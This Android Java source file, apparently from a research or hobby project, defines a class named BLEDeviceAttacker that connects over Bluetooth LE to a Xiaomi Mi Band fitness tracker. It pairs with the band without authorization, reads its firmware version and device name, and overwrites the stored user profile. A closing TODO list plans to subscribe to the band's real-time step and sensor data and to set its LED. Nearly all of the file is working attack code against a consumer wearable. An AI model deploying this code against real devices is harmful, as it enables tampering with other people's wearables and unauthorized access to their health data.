package cheng.kover.attacker;

import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothGatt;
import android.bluetooth.BluetoothGattCallback;
import android.bluetooth.BluetoothGattCharacteristic;
import android.bluetooth.BluetoothGattService;
import android.bluetooth.BluetoothProfile;
import android.content.Context;
import android.os.Handler;
import android.util.Log;

import java.io.UnsupportedEncodingException;
import java.util.Arrays;
import java.util.UUID;

public class BLEDeviceAttacker
{
	private static final String                TAG = "BLE Device Attacker";
	private              Context               context;
	private              BluetoothDevice       targetDevice;
	private              BluetoothGatt         bluetoothGatt;
	private              BluetoothGattCallback bluetoothGattCallback;

	public BLEDeviceAttacker(Context context)
	{
		this.context = context;

		// Process Bluetooth Callbacks.
		bluetoothGattCallback = new BluetoothGattCallback()
		{
			@Override
			public void onConnectionStateChange(BluetoothGatt gatt, int status, int newState)
			{
				super.onConnectionStateChange(gatt, status, newState);

				if (newState == BluetoothProfile.STATE_CONNECTED)
				{
					Log.i(TAG, "Connection established. Start discovering services.");
					gatt.discoverServices();
				}
				else
				{
					if (newState == BluetoothProfile.STATE_DISCONNECTED)
					{
						Log.w(TAG, "Disconnected!!!");
						gatt.close();
					}
				}
			}

			@Override
			public void onServicesDiscovered(BluetoothGatt gatt, int status)
			{
				super.onServicesDiscovered(gatt, status);
				if (status == BluetoothGatt.GATT_SUCCESS)
				{
					Log.i(TAG, "Services discovered.");
//					for (BluetoothGattService bluetoothGattService : gatt.getServices())
//					{
//						Log.d(TAG, " - Service: " + bluetoothGattService.getUuid());
//						for (BluetoothGattCharacteristic bluetoothGattCharacteristic : bluetoothGattService.getCharacteristics())
//						{
//							Log.d(TAG, " -- Characteristic: " + bluetoothGattCharacteristic.getUuid());
//						}
//					}
				}
				else
				{
					Log.e(TAG, "onServicesDiscovered received: " + status);
				}
			}

			@Override
			public void onCharacteristicRead(BluetoothGatt gatt, BluetoothGattCharacteristic characteristic, int status)
			{
				super.onCharacteristicRead(gatt, characteristic, status);
				if (status == BluetoothGatt.GATT_SUCCESS)
				{
					if (MiBandProfile.UUID_CHAR_DEVICE_INFO.equals(characteristic.getUuid()))
					{
						// Decode device info
						byte[] value           = characteristic.getValue();
						int    firmwareVersion = 0;
						for (int i = 0; i < 4; ++ i)
						{
							firmwareVersion |= (value[12 + i] & 255) << i * 8;
						}
						Log.i(TAG, "Device Info: Firmware Version - " + firmwareVersion);
					}
					if (MiBandProfile.UUID_CHAR_DEVICE_NAME.equals(characteristic.getUuid()))
					{
						// Decode device name
						try
						{
							Log.i(TAG, "Device Name" + Arrays.toString(characteristic.getValue()) + "," + new String(characteristic.getValue(), "UTF-8"));
						}
						catch (UnsupportedEncodingException e)
						{
							e.printStackTrace();
						}
					}
				}
				else
				{
					Log.e(TAG, characteristic.getUuid() + "onServicesDiscovered received: " + status);
				}
			}
		};
	}

	public void attack(final BluetoothDevice bluetoothDevice)
	{
		targetDevice = bluetoothDevice;

		// Connect and show Services & Characteristics.
		bluetoothGatt = targetDevice.connectGatt(context, false, bluetoothGattCallback);

		if (null == bluetoothGatt)
		{
			Log.e(TAG, "Didn't get BluetoothGatt.");
		}
		else
		{
			if (! bluetoothGatt.connect())
			{
				Log.e(TAG, "Connect failed.");
			}
			else
			{
				Handler handler = new Handler();
				handler.postDelayed(new Runnable()
				{
					private void delay()
					{
						try
						{
							Thread.sleep(1000);
						}
						catch (InterruptedException e)
						{
							e.printStackTrace();
						}
					}

					@Override
					public void run()
					{
						// Pair with MiBand
						readCharacteristic(MiBandProfile.UUID_SERVICE_MILI, MiBandProfile.UUID_CHAR_DATE_TIME);
						delay();
						writeCharacteristic(MiBandProfile.UUID_SERVICE_MILI, MiBandProfile.UUID_CHAR_PAIR, new byte[] {2});
						delay();
						readCharacteristic(MiBandProfile.UUID_SERVICE_MILI, MiBandProfile.UUID_CHAR_PAIR);
						delay();
						readCharacteristic(MiBandProfile.UUID_SERVICE_MILI, MiBandProfile.UUID_CHAR_DEVICE_INFO);
						delay();
						readCharacteristic(MiBandProfile.UUID_SERVICE_MILI, MiBandProfile.UUID_CHAR_DEVICE_NAME);
						delay();
						MiBandUserInfo miBandUserInfo      = new MiBandUserInfo(0, 0, 175, 70, "mi_user_alias", 0);
						byte[]         miBandUserInfoBytes = miBandUserInfo.toBytes(bluetoothDevice.getAddress());
						Log.d(TAG, "Set User Info: " + miBandUserInfo.toString() + ", bytes: " + bytesToHex(miBandUserInfoBytes));
// ***********************************Here's the write user info code.************************************************
						writeCharacteristic(MiBandProfile.UUID_SERVICE_MILI, MiBandProfile.UUID_CHAR_USER_INFO, miBandUserInfoBytes);
					}
				}, 5000);
			}
		}
	}

	public static String bytesToHex(byte[] bytes)
	{
		final char[] HEX_CHAR = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
		char[]       buf      = new char[bytes.length * 2];
		int          index    = 0;
		for (byte b : bytes)
		{
			buf[index++] = HEX_CHAR[b >>> 4 & 0xf];
			buf[index++] = HEX_CHAR[b & 0xf];
		}
		return new String(buf);
	}

	public void writeCharacteristic(UUID serviceUUID, UUID characteristicUUID, byte[] value)
	{
		Log.d("test", "service: " + serviceUUID + ", char: " + characteristicUUID + ", write v: " + Arrays.toString(value));
		BluetoothGattCharacteristic bluetoothGattCharacteristic = bluetoothGatt.getService(serviceUUID).getCharacteristic(characteristicUUID);
		if (null == bluetoothGattCharacteristic)
		{
			Log.e(TAG, "Characteristic " + characteristicUUID + " not exist.");
			return;
		}
		bluetoothGattCharacteristic.setValue(value);
		if (! bluetoothGatt.writeCharacteristic(bluetoothGattCharacteristic))
		{
			Log.e(TAG, "Bluetooth GATT write characteristic" + characteristicUUID + " failed.");
			return;
		}
		Log.i(TAG, "Characteristic" + characteristicUUID + " successfully written.");
	}

	public void readCharacteristic(UUID serviceUUID, UUID characteristicUUID)
	{
		BluetoothGattCharacteristic bluetoothGattCharacteristic = bluetoothGatt.getService(serviceUUID).getCharacteristic(characteristicUUID);
		if (! bluetoothGatt.readCharacteristic(bluetoothGattCharacteristic))
		{
			Log.e(TAG, "Bluetooth GATT read characteristic " + characteristicUUID + " failed.");
			return;
		}
	}
}

/*
TODO				"setNormalNotifyListener",11
TODO				"setRealtimeStepsNotifyListener",12
TODO				"enableRealtimeStepsNotify",13
TODO				"disableRealtimeStepsNotify",14
TODO				"miband.setLedColor(LedColor.RED);",17
TODO				"setSensorDataNotifyListener",19
TODO				"enableSensorDataNotify",20
TODO				"disableSensorDataNotify",21
*/
